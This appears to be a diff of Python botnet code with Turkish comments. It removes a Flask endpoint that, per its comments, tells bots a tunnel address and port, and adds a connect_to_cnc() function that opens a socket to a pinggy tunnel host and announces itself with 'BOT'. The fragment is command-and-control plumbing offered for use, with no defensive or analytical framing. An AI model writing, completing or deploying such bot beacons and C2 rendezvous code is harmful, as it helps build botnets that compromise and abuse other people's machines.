@@ -1,21 +1,13 @@
-from flask import Flask
-import os
-
-app = Flask(__name__)
-
-# --- AYARLAR ---
-# Pinggy'nin verdiği adresi buraya yapıştır (http:// kısmını sil)
-# Örnek: xuhba-34-6-91-209.run.pinggy-free.link
-TUNNEL_URL = "bddvy-34-6-91-209.run.pinggy-free.link"
-TUNNEL_PORT = 10101
-# ---------------
-
-@app.route('/')
-def index():
-    # Botlar bu adrese gelip TUNNEL_URL ve PORT bilgisini okuyacak
-    return f"{TUNNEL_URL}:{TUNNEL_PORT}"
-
-if __name__ == "__main__":
-    # Render'ın kendi portu (5000 veya otomatik atanan)
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+# app.py veya bot_logic.py içindeki bağlantı kısmı
+def connect_to_cnc():
+    # Buradaki linki her tünel yenilediğinde güncellemen gerekir
+    CNC_LINK = "qjtni-34-6-91-209.run.pinggy-free.link" 
+    CNC_PORT = 10101 # Tünelin dış kapısı
+    
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((CNC_LINK, CNC_PORT))
+        s.send("BOT".encode()) # "Ben geldim" mesajı
+        return s
+    except:
+        return None
